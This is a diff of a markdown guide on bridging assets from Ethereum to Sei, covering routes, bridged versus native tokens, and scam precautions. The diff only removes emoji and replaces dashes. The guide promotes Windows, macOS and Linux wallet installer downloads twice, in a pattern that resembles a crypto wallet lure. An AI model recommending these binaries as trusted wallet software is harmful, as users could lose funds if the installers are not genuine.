@@ -12,9 +12,9 @@
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
@@ -41,7 +41,7 @@ Two consequences follow:
 
 ## The routes that exist, and the one that does not
 
-**EVM-to-EVM bridges** connect Sei to other EVM chains, including Ethereum. These are contract-based and depend on the bridge operator. Which ones are live, and which contracts are canonical, changes over time — take that from Sei's documentation and the bridge's own site, typed rather than followed from a link.
+**EVM-to-EVM bridges** connect Sei to other EVM chains, including Ethereum. These are contract-based and depend on the bridge operator. Which ones are live, and which contracts are canonical, changes over time - take that from Sei's documentation and the bridge's own site, typed rather than followed from a link.
 
 **Native USDC via Circle's CCTP** is a different model: the issuer burns and mints its own asset rather than wrapping it. Sei's docs describe native USDC and CCTP V2 as supported, with the older Noble-issued USDC.n deprecated. If your goal is dollars on Sei, that is the route to look at rather than a wrapped stablecoin.
 
@@ -51,7 +51,7 @@ Two consequences follow:
 
 - **Confirm the contract address from the official documentation**, not from a search result or a message. A fake bridge is one of the most profitable scams in this space because the user is already primed to send funds to a contract.
 - **Check what you will receive.** The same ticker on two chains can be two different assets. A bridged SEI is not native SEI; it is a claim, and it may not be stakeable, spendable for gas, or redeemable if liquidity disappears.
-- **Check the destination address form.** A `0x…` address is what an EVM bridge expects. Sending to a `sei1…` form through a bridge interface is a mismatch that at best fails.
+- **Check the destination address form.** A `0x...` address is what an EVM bridge expects. Sending to a `sei1...` form through a bridge interface is a mismatch that at best fails.
 - **Have gas on both sides.** You need ETH to move on Ethereum and SEI to do anything after arrival on Sei.
 - **Start with a small amount.** Bridge fees make this expensive to test repeatedly, but the first transfer through an unfamiliar contract is exactly the one to keep small.
 
@@ -63,7 +63,7 @@ A bridged representation may be:
 - **dependent on the bridge's liquidity** for redemption back;
 - **subject to the bridge's pause switch**, which can freeze withdrawals during an incident.
 
-Native SEI, by contrast, pays gas and can be delegated. If your plan is to stake, check whether the asset you are receiving is native before you commit — [staking the bridged balance](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) only works on native SEI held in an account you control.
+Native SEI, by contrast, pays gas and can be delegated. If your plan is to stake, check whether the asset you are receiving is native before you commit - [staking the bridged balance](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md) only works on native SEI held in an account you control.
 
 ## After it arrives
 
@@ -88,7 +88,7 @@ What you can control is small but real: verified contract addresses, small first
 Two alternatives are usually better than bridging:
 
 - **Buy or withdraw SEI directly on Sei** through an exchange that supports the network. That avoids a contract entirely, and the exchange withdrawal article in this set covers the address and network rules.
-- **Use a wallet that supports both chains** and keep the assets separate rather than wrapping one into the other — [MetaMask as the bridge side](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) is the common configuration for that.
+- **Use a wallet that supports both chains** and keep the assets separate rather than wrapping one into the other - [MetaMask as the bridge side](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) is the common configuration for that.
 
 Bridging is worth it when you specifically need an asset that only exists on the other chain. It is rarely worth it for moving value between two chains that both list the asset.
 
@@ -106,15 +106,15 @@ Bridging is worth it when you specifically need an asset that only exists on the
 
 **Can I undo a bridge transaction?** No. It is final once confirmed.
 
-**Is native USDC different from bridged USDC?** Yes. Native USDC is issued by Circle through CCTP; the older Noble-issued USDC.n is deprecated per Sei's docs. [The address association](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) is unrelated but often confused with this — one is about which form an address takes, the other about which asset you hold.
+**Is native USDC different from bridged USDC?** Yes. Native USDC is issued by Circle through CCTP; the older Noble-issued USDC.n is deprecated per Sei's docs. [The address association](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) is unrelated but often confused with this - one is about which form an address takes, the other about which asset you hold.
 
 ## Download Sei Wallet
 
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
